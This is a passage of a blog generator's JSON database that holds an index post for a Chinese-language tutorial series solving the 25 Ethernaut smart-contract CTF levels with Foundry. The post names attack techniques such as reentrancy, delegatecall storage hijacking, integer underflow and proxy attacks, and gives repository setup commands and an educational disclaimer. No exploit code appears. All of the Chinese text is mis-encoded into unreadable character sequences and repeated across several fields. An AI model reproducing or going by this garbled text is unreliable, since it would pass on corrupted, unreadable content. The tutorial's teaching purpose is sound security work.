homePageName=\"å›åˆ°æˆ‘çš„ä¸»é¡µ\"></script>\n"},{"title":"ä¹¦å•","layout":"books","comments":0,"sidebar":"none","_content":"","source":"books/index.md","raw":"---\ntitle: ä¹¦å•\nlayout: books\ncomments: false\nsidebar: none\n---","date":"2025-09-08T03:49:04.027Z","updated":"2025-09-08T03:49:04.027Z","path":"books/index.html","_id":"cmfc7zboz000abf5q1xjpd9wq","content":"","excerpt":"","more":""},{"title":"åˆ†ç±»","layout":"categories","comments":0,"_content":"","source":"categories/index.md","raw":"---\ntitle: åˆ†ç±»\nlayout: categories\ncomments: false\n---\n","date":"2025-09-08T03:49:04.027Z","updated":"2025-09-08T03:49:04.027Z","path":"categories/index.html","_id":"cmfc7zbp1000fbf5q1vgs3oyb","content":"","excerpt":"","more":""},{"title":"å‹æƒ…é“¾æ¥","layout":"links","comments":1,"sidebar":"none","_content":"","source":"links/index.md","raw":"---\ntitle: å‹æƒ…é“¾æ¥\nlayout: links\ncomments: true\nsidebar: none\n---","date":"2025-09-08T03:49:04.027Z","updated":"2025-09-08T03:49:04.027Z","path":"links/index.html","_id":"cmfc7zbp3000hbf5q4vrd6fw2","content":"","excerpt":"","more":""},{"title":"Repositories","layout":"repository","comments":0,"sidebar":"none","_content":"","source":"repository/index.md","raw":"---\ntitle: Repositories\nlayout: repository\ncomments: false\nsidebar: none\n---\n","date":"2025-09-08T03:49:04.027Z","updated":"2025-09-08T03:49:04.027Z","path":"repository/index.html","_id":"cmfc7zbp4000mbf5q6rsb71la","content":"","excerpt":"","more":""},{"title":"æ ‡ç­¾","layout":"tags","comments":0,"_content":"","source":"tags/index.md","raw":"---\ntitle: æ ‡ç­¾\nlayout: tags\ncomments: false\n---\n","date":"2025-09-08T03:49:04.027Z","updated":"2025-09-08T03:49:04.027Z","path":"tags/index.html","_id":"cmfc7zbp5000obf5q9j703rnp","content":"","excerpt":"","more":""}],"Post":[{"title":"Dapp","date":"2025-01-25T12:20:29.000Z","_content":"\n## Dapp\n\n### dapp type\nsolidity\nrust\n","source":"_posts/Dapp.md","raw":"---\ntitle: Dapp\ndate: 2025-01-25 20:20:29\ntags: dapp\ncategories:\n- Dapp\n---\n\n## Dapp\n\n### dapp type\nsolidity\nrust\n","slug":"Dapp","published":1,"updated":"2025-09-08T03:49:04.027Z","comments":1,"layout":"post","photos":[],"_id":"cmfc7zboq0001bf5q1n3kad9f","content":"<h2 id=\"Dapp\"><a href=\"#Dapp\" class=\"headerlink\" title=\"Dapp\"></a>Dapp</h2><h3 id=\"dapp-type\"><a href=\"#dapp-type\" class=\"headerlink\" title=\"dapp type\"></a>dapp type</h3><p>solidity<br>rust</p>\n","excerpt":"","more":"<h2 id=\"Dapp\"><a href=\"#Dapp\" class=\"headerlink\" title=\"Dapp\"></a>Dapp</h2><h3 id=\"dapp-type\"><a href=\"#dapp-type\" class=\"headerlink\" title=\"dapp type\"></a>dapp type</h3><p>solidity<br>rust</p>\n"},{"title":"Ethernaut Foundry Solutions - å®Œæ•´ç³»åˆ—æ•™ç¨‹","date":"2025-01-25T06:00:00.000Z","updated":"2025-01-25T06:00:00.000Z","excerpt":"æ·±å…¥è§£æå¦‚ä½•ä½¿ç”¨ Foundry æ¡†æ¶è§£å†³ OpenZeppelin Ethernaut CTF æŒ‘æˆ˜ï¼Œä»åŸºç¡€è®¾ç½®åˆ°é«˜çº§æ”»å‡»æŠ€æœ¯çš„å®Œæ•´æŒ‡å—ã€‚","_content":"\n# ğŸ›¡ï¸ Ethernaut Foundry Solutions - å®Œæ•´ç³»åˆ—æ•™ç¨‹\n\n> **Ethernaut** æ˜¯ç”± OpenZeppelin å¼€å‘çš„ Web3/Solidity æ™ºèƒ½åˆçº¦å®‰å…¨ CTFï¼ˆCapture The Flagï¼‰æ¸¸æˆï¼Œçµæ„Ÿæ¥æºäº overthewire.orgã€‚æ¯ä¸ªå…³å¡éƒ½æ˜¯ä¸€ä¸ªæ™ºèƒ½åˆçº¦ï¼Œç©å®¶éœ€è¦æ‰¾åˆ°æ¼æ´å¹¶åˆ©ç”¨å®ƒä»¬æ¥å®ŒæˆæŒ‘æˆ˜ã€‚\n\n## ğŸ“š ç³»åˆ—ä»‹ç»\n\næœ¬ç³»åˆ—æ–‡ç« è¯¦ç»†ä»‹ç»å¦‚ä½•ä½¿ç”¨ **Foundry** æ¡†æ¶æ¥è§£å†³ Ethernaut çš„å„ä¸ªæŒ‘æˆ˜ã€‚Foundry æ˜¯ä¸€ä¸ªç°ä»£åŒ–çš„ä»¥å¤ªåŠå¼€å‘å·¥å…·å¥—ä»¶ï¼Œæä¾›äº†å¼ºå¤§çš„æµ‹è¯•ã€éƒ¨ç½²å’Œè°ƒè¯•åŠŸèƒ½ã€‚\n\n### ğŸ¯ å­¦ä¹ ç›®æ ‡\n\né€šè¿‡æœ¬ç³»åˆ—ï¼Œä½ å°†å­¦ä¼šï¼š\n\n- âœ… **Foundry æ¡†æ¶çš„ä½¿ç”¨**ï¼šä»å®‰è£…åˆ°é«˜çº§åŠŸèƒ½\n- âœ… **æ™ºèƒ½åˆçº¦å®‰å…¨å®¡è®¡**ï¼šè¯†åˆ«å¸¸è§æ¼æ´æ¨¡å¼\n- âœ… **æ”»å‡»æŠ€æœ¯å®ç°**ï¼šé‡å…¥æ”»å‡»ã€æ•´æ•°æº¢å‡ºã€æƒé™æå‡ç­‰\n- âœ… **é˜²å¾¡æœºåˆ¶è®¾è®¡**ï¼šå¦‚ä½•ç¼–å†™æ›´å®‰å…¨çš„æ™ºèƒ½åˆçº¦\n- âœ… **CTF è§£é¢˜æ€è·¯**ï¼šç³»ç»ŸåŒ–çš„å®‰å…¨åˆ†ææ–¹æ³•\n\n## ğŸ—ï¸ æŠ€æœ¯æ ˆ\n\n- **Foundry**: ä»¥å¤ªåŠå¼€å‘æ¡†æ¶\n- **Solidity**: æ™ºèƒ½åˆçº¦ç¼–ç¨‹è¯­è¨€\n- **OpenZeppelin**: å®‰å…¨åˆçº¦åº“\n- **EVM**: ä»¥å¤ªåŠè™šæ‹Ÿæœº\n\n## ğŸ“– å®Œæ•´å…³å¡åˆ—è¡¨\n\n### åŸºç¡€æ”»å‡»ç¯‡ (Level 1-10)\n\n1. **[Level 1: Fallback - å›é€€å‡½æ•°æ¼æ´](/2025/01/25/ethernaut-level-01-fallback/)**\n   - Fallback å‡½æ•°æƒé™æå‡\n   - æœ€åŸºç¡€çš„åˆçº¦æ”»å‡»\n\n2. **[Level 2: Fallout - æ„é€ å‡½æ•°æ‹¼å†™é”™è¯¯](/2025/01/25/ethernaut-level-02-fallout/)**\n   - æ„é€ å‡½æ•°å‘½åæ¼æ´\n   - ä»£ç å®¡è®¡é‡è¦æ€§\n\n3. **[Level 3: Coin Flip - ä¼ªéšæœºæ•°æ”»å‡»](/2025/01/25/ethernaut-level-03-coinflip/)**\n   - åŒºå—é“¾ä¼ªéšæœºæ•°æ¼æ´\n   - å¯é¢„æµ‹æ€§æ”»å‡»\n\n4. **[Level 4: Telephone - tx.origin vs msg.sender](/2025/01/25/ethernaut-level-04-telephone/)**\n   - èº«ä»½éªŒè¯ç»•è¿‡\n   - ä¸­é—´åˆçº¦æ”»å‡»\n\n5. **[Level 5: Token - æ•´æ•°ä¸‹æº¢æ”»å‡»](/2025/01/25/ethernaut-level-05-token/)**\n   - ç®—æœ¯æº¢å‡ºæ¼æ´\n   - SafeMath çš„é‡è¦æ€§\n\n6. **[Level 6: Delegation - delegatecall æ”»å‡»](/2025/01/25/ethernaut-level-06-delegation/)**\n   - delegatecall å­˜å‚¨æ§½æ”»å‡»\n   - ä¸Šä¸‹æ–‡åˆ‡æ¢æ¼æ´\n\n7. **[Level 7: Force - å¼ºåˆ¶å‘é€ä»¥å¤ªå¸](/2025/01/25/ethernaut-level-07-force/)**\n   - selfdestruct å¼ºåˆ¶è½¬è´¦\n   - åˆçº¦ä½™é¢æ“æ§\n\n8. **[Level 8: Vault - ç§æœ‰å˜é‡è¯»å–](/2025/01/25/ethernaut-level-08-vault/)**\n   - åŒºå—é“¾æ•°æ®é€æ˜æ€§\n   - å­˜å‚¨æ§½åˆ†æ\n\n9. **[Level 9: King - æ‹’ç»æœåŠ¡æ”»å‡»](/2025/01/25/ethernaut-level-09-king/)**\n   - DoS æ”»å‡»æ¨¡å¼\n   - æ¶æ„åˆçº¦é˜»æ–­\n\n10. **[Level 10: Re-entrancy - é‡å…¥æ”»å‡»](/2025/01/25/ethernaut-level-10-reentrancy/)**\n    - ç»å…¸é‡å…¥æ”»å‡»\n    - æ£€æŸ¥-æ•ˆæœ-äº¤äº’æ¨¡å¼\n\n### è¿›é˜¶æ”»å‡»ç¯‡ (Level 11-20)\n\n11. **[Level 11: Elevator - æ¥å£å®ç°æ”»å‡»](/2025/01/25/ethernaut-level-11-elevator/)**\n    - æ¥å£æ¶æ„å®ç°\n    - çŠ¶æ€å˜åŒ–åˆ©ç”¨\n\n12. **[Level 12: Privacy - å­˜å‚¨å¸ƒå±€åˆ†æ](/2025/01/25/ethernaut-level-12-privacy/)**\n    - å¤æ‚å­˜å‚¨å¸ƒå±€\n    - ç§æœ‰æ•°æ®æå–\n\n13. **[Level 13: Gatekeeper One - å¤šé‡éªŒè¯ç»•è¿‡](/2025/01/25/ethernaut-level-13-gatekeeper-one/)**\n    - Gas ç²¾ç¡®æ§åˆ¶\n    - ç±»å‹è½¬æ¢æ”»å‡»\n\n14. **[Level 14: Gatekeeper Two - é«˜çº§éªŒè¯ç»•è¿‡](/2025/01/25/ethernaut-level-14-gatekeeper-two/)**\n    - è¿è¡Œæ—¶åˆ›å»ºåˆçº¦\n    - ä½è¿ç®—æ”»å‡»\n\n15. **[Level 15: Naught Coin - ERC20 æˆæƒæ”»å‡»](/2025/01/25/ethernaut-level-15-naughtcoin/)**\n    - ERC20 transferFrom ç»•è¿‡\n    - æˆæƒæœºåˆ¶æ¼æ´\n\n16. **[Level 16: Preservation - å­˜å‚¨æ§½åŠ«æŒ](/2025/01/25/ethernaut-level-16-preservation/)**\n    - å­˜å‚¨æ§½å¸ƒå±€æ”»å‡»\n    - delegatecall é«˜çº§åˆ©ç”¨\n\n17. **[Level 17: Recovery - åˆçº¦åœ°å€è®¡ç®—](/2025/01/25/ethernaut-level-17-recovery/)**\n    - CREATE åœ°å€é¢„æµ‹\n    - ä¸¢å¤±åˆçº¦æ¢å¤\n\n18. **[Level 18: Magic Number - å­—èŠ‚ç åˆ†æ](/2025/01/25/ethernaut-level-18-magicnumber/)**\n    - æ‰‹å†™å­—èŠ‚ç \n    - EVM åº•å±‚åŸç†\n\n19. **[Level 19: Alien Codex - æ•°ç»„è¾¹ç•Œæ”»å‡»](/2025/01/25/ethernaut-level-19-aliencodex/)**\n    - åŠ¨æ€æ•°ç»„ä¸‹æº¢\n    - å­˜å‚¨æ§½ä»»æ„å†™å…¥\n\n20. **[Level 20: Denial - Gas è€—å°½æ”»å‡»](/2025/01/25/ethernaut-level-20-denial/)**\n    - åˆ†çº¢åˆçº¦æ”»å‡»\n    - Gas æ¶ˆè€— DoS\n\n### é«˜çº§æ”»å‡»ç¯‡ (Level 21-25)\n\n21. **[Level 21: Shop - è§†å›¾å‡½æ•°æ”»å‡»](/2025/01/25/ethernaut-level-21-shop/)**\n    - view å‡½æ•°çŠ¶æ€åˆ©ç”¨\n    - ä»·æ ¼æ“æ§æ”»å‡»\n\n22. **[Level 22: Dex - DEX ä»·æ ¼æ“æ§](/2025/01/25/ethernaut-level-22-dex/)**\n    - AMM ä»·æ ¼è®¡ç®—æ¼æ´\n    - æµåŠ¨æ€§æ”»å‡»\n\n23. **[Level 23: Dex Two - ä»£å¸æ³¨å…¥æ”»å‡»](/2025/01/25/ethernaut-level-23-dextwo/)**\n    - æ¶æ„ä»£å¸æ³¨å…¥\n    - DEX å®‰å…¨è¿›é˜¶\n\n24. **[Level 24: Puzzle Wallet - å¤šé‡ç­¾åé’±åŒ…æ”»å‡»](/2025/01/25/ethernaut-level-24-puzzlewallet/)**\n    - ä»£ç†æ¨¡å¼æ”»å‡»\n    - å¤æ‚çŠ¶æ€ç®¡ç†\n\n25. **[Level 25: Motorbike - UUPS ä»£ç†æ”»å‡»](/2025/01/25/ethernaut-level-25-motorbike/)**\n    - å‡çº§æ¨¡å¼æ¼æ´\n    - å®ç°åˆçº¦æ”»å‡»\n\n## ğŸ› ï¸ å¿«é€Ÿå¼€å§‹\n\n```bash\n# å…‹éš†é¡¹ç›®\ngit clone https://github.com/XuHugo/Ethernaut-Foundry-Solutions.git\ncd Ethernaut-Foundry-Solutions\n\n# å®‰è£…ä¾èµ–\nforge install\n\n# è¿è¡Œæ‰€æœ‰æµ‹è¯•\nforge test\n\n# è¿è¡Œç‰¹å®šå…³å¡æµ‹è¯•\nforge test --match-contract FallbackTest -vvv\n```\n\n## ğŸ”— ç›¸å…³èµ„æº\n\n- **[GitHub é¡¹ç›®åœ°å€](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n- **[Ethernaut å®˜ç½‘](https://ethernaut.openzeppelin.com/)**\n- **[Foundry å®˜æ–¹æ–‡æ¡£](https://book.getfoundry.sh/)**\n- **[OpenZeppelin æ–‡æ¡£](https://docs.openzeppelin.com/)**\n\n## ğŸš¨ å…è´£å£°æ˜\n\næœ¬ç³»åˆ—æ–‡ç« çº¯å±æ•™è‚²ç›®çš„ï¼Œæ‰€æœ‰å†…å®¹ä»…ç”¨äºï¼š\n- å­¦ä¹ æ™ºèƒ½åˆçº¦å®‰å…¨çŸ¥è¯†\n- ç†è§£å¸¸è§æ¼æ´æ¨¡å¼\n- æé«˜ä»£ç å®¡è®¡èƒ½åŠ›\n\nè¯·å‹¿å°†ç›¸å…³æŠ€æœ¯ç”¨äºæ”»å‡»çœŸå®çš„æ™ºèƒ½åˆçº¦æˆ–è¿›è¡Œä»»ä½•éæ³•æ´»åŠ¨ã€‚\n\n## ğŸ¤ è´¡çŒ®ä¸åé¦ˆ\n\nå¦‚æœä½ å‘ç°ä»»ä½•é—®é¢˜æˆ–æœ‰æ”¹è¿›å»ºè®®ï¼Œæ¬¢è¿ï¼š\n- åœ¨ GitHub æäº¤ Issue\n- å‘èµ· Pull Request\n- åœ¨è¯„è®ºåŒºè®¨è®º\n\n---\n\n*è®©æˆ‘ä»¬ä¸€èµ·æ„å»ºæ›´å®‰å…¨çš„ Web3 ä¸–ç•Œï¼* ğŸŒŸ","source":"_posts/ethernaut-foundry-solutions-series.md","raw":"---\ntitle: 'Ethernaut Foundry Solutions - å®Œæ•´ç³»åˆ—æ•™ç¨‹'\ndate: 2025-01-25 14:00:00\nupdated: 2025-01-25 14:00:00\ncategories:\n  - Web3å®‰å…¨\n  - æ™ºèƒ½åˆçº¦\ntags:\n  - Ethernaut\n  - Foundry\n  - æ™ºèƒ½åˆçº¦å®‰å…¨\n  - CTF\n  - Solidity\n  - Web3\n  - åŒºå—é“¾å®‰å…¨\n  - Capture The Flag\nexcerpt: \"æ·±å…¥è§£æå¦‚ä½•ä½¿ç”¨ Foundry æ¡†æ¶è§£å†³ OpenZeppelin Ethernaut CTF æŒ‘æˆ˜ï¼Œä»åŸºç¡€è®¾ç½®åˆ°é«˜çº§æ”»å‡»æŠ€æœ¯çš„å®Œæ•´æŒ‡å—ã€‚\"\n---\n\n# ğŸ›¡ï¸ Ethernaut Foundry Solutions - å®Œæ•´ç³»åˆ—æ•™ç¨‹\n\n> **Ethernaut** æ˜¯ç”± OpenZeppelin å¼€å‘çš„ Web3/Solidity æ™ºèƒ½åˆçº¦å®‰å…¨ CTFï¼ˆCapture The Flagï¼‰æ¸¸æˆï¼Œçµæ„Ÿæ¥æºäº overthewire.orgã€‚æ¯ä¸ªå…³å¡éƒ½æ˜¯ä¸€ä¸ªæ™ºèƒ½åˆçº¦ï¼Œç©å®¶éœ€è¦æ‰¾åˆ°æ¼æ´å¹¶åˆ©ç”¨å®ƒä»¬æ¥å®ŒæˆæŒ‘æˆ˜ã€‚\n\n## ğŸ“š ç³»åˆ—ä»‹ç»\n\næœ¬ç³»åˆ—æ–‡ç« è¯¦ç»†ä»‹ç»å¦‚ä½•ä½¿ç”¨ **Foundry** æ¡†æ¶æ¥è§£å†³ Ethernaut çš„å„ä¸ªæŒ‘æˆ˜ã€‚Foundry æ˜¯ä¸€ä¸ªç°ä»£åŒ–çš„ä»¥å¤ªåŠå¼€å‘å·¥å…·å¥—ä»¶ï¼Œæä¾›äº†å¼ºå¤§çš„æµ‹è¯•ã€éƒ¨ç½²å’Œè°ƒè¯•åŠŸèƒ½ã€‚\n\n### ğŸ¯ å­¦ä¹ ç›®æ ‡\n\né€šè¿‡æœ¬ç³»åˆ—ï¼Œä½ å°†å­¦ä¼šï¼š\n\n- âœ… **Foundry æ¡†æ¶çš„ä½¿ç”¨**ï¼šä»å®‰è£…åˆ°é«˜çº§åŠŸèƒ½\n- âœ… **æ™ºèƒ½åˆçº¦å®‰å…¨å®¡è®¡**ï¼šè¯†åˆ«å¸¸è§æ¼æ´æ¨¡å¼\n- âœ… **æ”»å‡»æŠ€æœ¯å®ç°**ï¼šé‡å…¥æ”»å‡»ã€æ•´æ•°æº¢å‡ºã€æƒé™æå‡ç­‰\n- âœ… **é˜²å¾¡æœºåˆ¶è®¾è®¡**ï¼šå¦‚ä½•ç¼–å†™æ›´å®‰å…¨çš„æ™ºèƒ½åˆçº¦\n- âœ… **CTF è§£é¢˜æ€è·¯**ï¼šç³»ç»ŸåŒ–çš„å®‰å…¨åˆ†ææ–¹æ³•\n\n## ğŸ—ï¸ æŠ€æœ¯æ ˆ\n\n- **Foundry**: ä»¥å¤ªåŠå¼€å‘æ¡†æ¶\n- **Solidity**: æ™ºèƒ½åˆçº¦ç¼–ç¨‹è¯­è¨€\n- **OpenZeppelin**: å®‰å…¨åˆçº¦åº“\n- **EVM**: ä»¥å¤ªåŠè™šæ‹Ÿæœº\n\n## ğŸ“– å®Œæ•´å…³å¡åˆ—è¡¨\n\n### åŸºç¡€æ”»å‡»ç¯‡ (Level 1-10)\n\n1. **[Level 1: Fallback - å›é€€å‡½æ•°æ¼æ´](/2025/01/25/ethernaut-level-01-fallback/)**\n   - Fallback å‡½æ•°æƒé™æå‡\n   - æœ€åŸºç¡€çš„åˆçº¦æ”»å‡»\n\n2. **[Level 2: Fallout - æ„é€ å‡½æ•°æ‹¼å†™é”™è¯¯](/2025/01/25/ethernaut-level-02-fallout/)**\n   - æ„é€ å‡½æ•°å‘½åæ¼æ´\n   - ä»£ç å®¡è®¡é‡è¦æ€§\n\n3. **[Level 3: Coin Flip - ä¼ªéšæœºæ•°æ”»å‡»](/2025/01/25/ethernaut-level-03-coinflip/)**\n   - åŒºå—é“¾ä¼ªéšæœºæ•°æ¼æ´\n   - å¯é¢„æµ‹æ€§æ”»å‡»\n\n4. **[Level 4: Telephone - tx.origin vs msg.sender](/2025/01/25/ethernaut-level-04-telephone/)**\n   - èº«ä»½éªŒè¯ç»•è¿‡\n   - ä¸­é—´åˆçº¦æ”»å‡»\n\n5. **[Level 5: Token - æ•´æ•°ä¸‹æº¢æ”»å‡»](/2025/01/25/ethernaut-level-05-token/)**\n   - ç®—æœ¯æº¢å‡ºæ¼æ´\n   - SafeMath çš„é‡è¦æ€§\n\n6. **[Level 6: Delegation - delegatecall æ”»å‡»](/2025/01/25/ethernaut-level-06-delegation/)**\n   - delegatecall å­˜å‚¨æ§½æ”»å‡»\n   - ä¸Šä¸‹æ–‡åˆ‡æ¢æ¼æ´\n\n7. **[Level 7: Force - å¼ºåˆ¶å‘é€ä»¥å¤ªå¸](/2025/01/25/ethernaut-level-07-force/)**\n   - selfdestruct å¼ºåˆ¶è½¬è´¦\n   - åˆçº¦ä½™é¢æ“æ§\n\n8. **[Level 8: Vault - ç§æœ‰å˜é‡è¯»å–](/2025/01/25/ethernaut-level-08-vault/)**\n   - åŒºå—é“¾æ•°æ®é€æ˜æ€§\n   - å­˜å‚¨æ§½åˆ†æ\n\n9. **[Level 9: King - æ‹’ç»æœåŠ¡æ”»å‡»](/2025/01/25/ethernaut-level-09-king/)**\n   - DoS æ”»å‡»æ¨¡å¼\n   - æ¶æ„åˆçº¦é˜»æ–­\n\n10. **[Level 10: Re-entrancy - é‡å…¥æ”»å‡»](/2025/01/25/ethernaut-level-10-reentrancy/)**\n    - ç»å…¸é‡å…¥æ”»å‡»\n    - æ£€æŸ¥-æ•ˆæœ-äº¤äº’æ¨¡å¼\n\n### è¿›é˜¶æ”»å‡»ç¯‡ (Level 11-20)\n\n11. **[Level 11: Elevator - æ¥å£å®ç°æ”»å‡»](/2025/01/25/ethernaut-level-11-elevator/)**\n    - æ¥å£æ¶æ„å®ç°\n    - çŠ¶æ€å˜åŒ–åˆ©ç”¨\n\n12. **[Level 12: Privacy - å­˜å‚¨å¸ƒå±€åˆ†æ](/2025/01/25/ethernaut-level-12-privacy/)**\n    - å¤æ‚å­˜å‚¨å¸ƒå±€\n    - ç§æœ‰æ•°æ®æå–\n\n13. **[Level 13: Gatekeeper One - å¤šé‡éªŒè¯ç»•è¿‡](/2025/01/25/ethernaut-level-13-gatekeeper-one/)**\n    - Gas ç²¾ç¡®æ§åˆ¶\n    - ç±»å‹è½¬æ¢æ”»å‡»\n\n14. **[Level 14: Gatekeeper Two - é«˜çº§éªŒè¯ç»•è¿‡](/2025/01/25/ethernaut-level-14-gatekeeper-two/)**\n    - è¿è¡Œæ—¶åˆ›å»ºåˆçº¦\n    - ä½è¿ç®—æ”»å‡»\n\n15. **[Level 15: Naught Coin - ERC20 æˆæƒæ”»å‡»](/2025/01/25/ethernaut-level-15-naughtcoin/)**\n    - ERC20 transferFrom ç»•è¿‡\n    - æˆæƒæœºåˆ¶æ¼æ´\n\n16. **[Level 16: Preservation - å­˜å‚¨æ§½åŠ«æŒ](/2025/01/25/ethernaut-level-16-preservation/)**\n    - å­˜å‚¨æ§½å¸ƒå±€æ”»å‡»\n    - delegatecall é«˜çº§åˆ©ç”¨\n\n17. **[Level 17: Recovery - åˆçº¦åœ°å€è®¡ç®—](/2025/01/25/ethernaut-level-17-recovery/)**\n    - CREATE åœ°å€é¢„æµ‹\n    - ä¸¢å¤±åˆçº¦æ¢å¤\n\n18. **[Level 18: Magic Number - å­—èŠ‚ç åˆ†æ](/2025/01/25/ethernaut-level-18-magicnumber/)**\n    - æ‰‹å†™å­—èŠ‚ç \n    - EVM åº•å±‚åŸç†\n\n19. **[Level 19: Alien Codex - æ•°ç»„è¾¹ç•Œæ”»å‡»](/2025/01/25/ethernaut-level-19-aliencodex/)**\n    - åŠ¨æ€æ•°ç»„ä¸‹æº¢\n    - å­˜å‚¨æ§½ä»»æ„å†™å…¥\n\n20. **[Level 20: Denial - Gas è€—å°½æ”»å‡»](/2025/01/25/ethernaut-level-20-denial/)**\n    - åˆ†çº¢åˆçº¦æ”»å‡»\n    - Gas æ¶ˆè€— DoS\n\n### é«˜çº§æ”»å‡»ç¯‡ (Level 21-25)\n\n21. **[Level 21: Shop - è§†å›¾å‡½æ•°æ”»å‡»](/2025/01/25/ethernaut-level-21-shop/)**\n    - view å‡½æ•°çŠ¶æ€åˆ©ç”¨\n    - ä»·æ ¼æ“æ§æ”»å‡»\n\n22. **[Level 22: Dex - DEX ä»·æ ¼æ“æ§](/2025/01/25/ethernaut-level-22-dex/)**\n    - AMM ä»·æ ¼è®¡ç®—æ¼æ´\n    - æµåŠ¨æ€§æ”»å‡»\n\n23. **[Level 23: Dex Two - ä»£å¸æ³¨å…¥æ”»å‡»](/2025/01/25/ethernaut-level-23-dextwo/)**\n    - æ¶æ„ä»£å¸æ³¨å…¥\n    - DEX å®‰å…¨è¿›é˜¶\n\n24. **[Level 24: Puzzle Wallet - å¤šé‡ç­¾åé’±åŒ…æ”»å‡»](/2025/01/25/ethernaut-level-24-puzzlewallet/)**\n    - ä»£ç†æ¨¡å¼æ”»å‡»\n    - å¤æ‚çŠ¶æ€ç®¡ç†\n\n25. **[Level 25: Motorbike - UUPS ä»£ç†æ”»å‡»](/2025/01/25/ethernaut-level-25-motorbike/)**\n    - å‡çº§æ¨¡å¼æ¼æ´\n    - å®ç°åˆçº¦æ”»å‡»\n\n## ğŸ› ï¸ å¿«é€Ÿå¼€å§‹\n\n```bash\n# å…‹éš†é¡¹ç›®\ngit clone https://github.com/XuHugo/Ethernaut-Foundry-Solutions.git\ncd Ethernaut-Foundry-Solutions\n\n# å®‰è£…ä¾èµ–\nforge install\n\n# è¿è¡Œæ‰€æœ‰æµ‹è¯•\nforge test\n\n# è¿è¡Œç‰¹å®šå…³å¡æµ‹è¯•\nforge test --match-contract FallbackTest -vvv\n```\n\n## ğŸ”— ç›¸å…³èµ„æº\n\n- **[GitHub é¡¹ç›®åœ°å€](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n- **[Ethernaut å®˜ç½‘](https://ethernaut.openzeppelin.com/)**\n- **[Foundry å®˜æ–¹æ–‡æ¡£](https://book.getfoundry.sh/)**\n- **[OpenZeppelin æ–‡æ¡£](https://docs.openzeppelin.com/)**\n\n## ğŸš¨ å…è´£å£°æ˜\n\næœ¬ç³»åˆ—æ–‡ç« çº¯å±æ•™è‚²ç›®çš„ï¼Œæ‰€æœ‰å†…å®¹ä»…ç”¨äºï¼š\n- å­¦ä¹ æ™ºèƒ½åˆçº¦å®‰å…¨çŸ¥è¯†\n- ç†è§£å¸¸è§æ¼æ´æ¨¡å¼\n- æé«˜ä»£ç å®¡è®¡èƒ½åŠ›\n\nè¯·å‹¿å°†ç›¸å…³æŠ€æœ¯ç”¨äºæ”»å‡»çœŸå®çš„æ™ºèƒ½åˆçº¦æˆ–è¿›è¡Œä»»ä½•éæ³•æ´»åŠ¨ã€‚\n\n## ğŸ¤ è´¡çŒ®ä¸åé¦ˆ\n\nå¦‚æœä½ å‘ç°ä»»ä½•é—®é¢˜æˆ–æœ‰æ”¹è¿›å»ºè®®ï¼Œæ¬¢è¿ï¼š\n- åœ¨ GitHub æäº¤ Issue\n- å‘èµ· Pull Request\n- åœ¨è¯„è®ºåŒºè®¨è®º\n\n---\n\n*è®©æˆ‘ä»¬ä¸€èµ·æ„å»ºæ›´å®‰å…¨çš„ Web3 ä¸–ç•Œï¼* ğŸŒŸ","slug":"ethernaut-foundry-solutions-series","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbot0003bf5q88kh29z4","content":"<h1 id=\"ğŸ›¡ï¸-Ethernaut-Foundry-Solutions-å®Œæ•´ç³»åˆ—æ•™ç¨‹\"><a href=\"#ğŸ›¡ï¸-Ethernaut-Foundry-Solutions-å®Œæ•´ç³»åˆ—æ•™ç¨‹\" class=\"headerlink\" title=\"ğŸ›¡ï¸ Ethernaut Foundry Solutions - å®Œæ•´ç³»åˆ—æ•™ç¨‹\"></a>ğŸ›¡ï¸ Ethernaut Foundry Solutions - å®Œæ•´ç³»åˆ—æ•™ç¨‹</h1><blockquote>\n<p><strong>Ethernaut</strong> æ˜¯ç”± OpenZeppelin å¼€å‘çš„ Web3&#x2F;Solidity æ™ºèƒ½åˆçº¦å®‰å…¨ CTFï¼ˆCapture The Flagï¼‰æ¸¸æˆï¼Œçµæ„Ÿæ¥æºäº overthewire.orgã€‚æ¯ä¸ªå…³å¡éƒ½æ˜¯ä¸€ä¸ªæ™ºèƒ½åˆçº¦ï¼Œç©å®¶éœ€è¦æ‰¾åˆ°æ¼æ´å¹¶åˆ©ç”¨å®ƒä»¬æ¥å®ŒæˆæŒ‘æˆ˜ã€‚</p>\n</blockquote>\n<h2 id=\"ğŸ“š-ç³»åˆ—ä»‹ç»\"><a href=\"#ğŸ“š-ç³»åˆ—ä»‹ç»\" class=\"headerlink\" title=\"ğŸ“š ç³»åˆ—ä»‹ç»\"></a>ğŸ“š ç³»åˆ—ä»‹ç»</h2><p>æœ¬ç³»åˆ—æ–‡ç« è¯¦ç»†ä»‹ç»å¦‚ä½•ä½¿ç”¨ <strong>Foundry</strong> æ¡†æ¶æ¥è§£å†³ Ethernaut çš„å„ä¸ªæŒ‘æˆ˜ã€‚Foundry æ˜¯ä¸€ä¸ªç°ä»£åŒ–çš„ä»¥å¤ªåŠå¼€å‘å·¥å…·å¥—ä»¶ï¼Œæä¾›äº†å¼ºå¤§çš„æµ‹è¯•ã€éƒ¨ç½²å’Œè°ƒè¯•åŠŸèƒ½ã€‚</p>\n<h3 id=\"ğŸ¯-å­¦ä¹ ç›®æ ‡\"><a href=\"#ğŸ¯-å­¦ä¹ ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ¯ å­¦ä¹ ç›®æ ‡\"></a>ğŸ¯ å­¦ä¹ ç›®æ ‡</h3><p>é€šè¿‡æœ¬ç³»åˆ—ï¼Œä½ å°†å­¦ä¼šï¼š</p>\n<ul>\n<li>âœ… <strong>Foundry æ¡†æ¶çš„ä½¿ç”¨</strong>ï¼šä»å®‰è£…åˆ°é«˜çº§åŠŸèƒ½</li>\n<li>âœ… <strong>æ™ºèƒ½åˆçº¦å®‰å…¨å®¡è®¡</strong>ï¼šè¯†åˆ«å¸¸è§æ¼æ´æ¨¡å¼</li>\n<li>âœ… <strong>æ”»å‡»æŠ€æœ¯å®ç°</strong>ï¼šé‡å…¥æ”»å‡»ã€æ•´æ•°æº¢å‡ºã€æƒé™æå‡ç­‰</li>\n<li>âœ… <strong>é˜²å¾¡æœºåˆ¶è®¾è®¡</strong>ï¼šå¦‚ä½•ç¼–å†™æ›´å®‰å…¨çš„æ™ºèƒ½åˆçº¦</li>\n<li>âœ… <strong>CTF è§£é¢˜æ€è·¯</strong>ï¼šç³»ç»ŸåŒ–çš„å®‰å…¨åˆ†ææ–¹æ³•</li>\n</ul>\n<h2 id=\"ğŸ—ï¸-æŠ€æœ¯æ 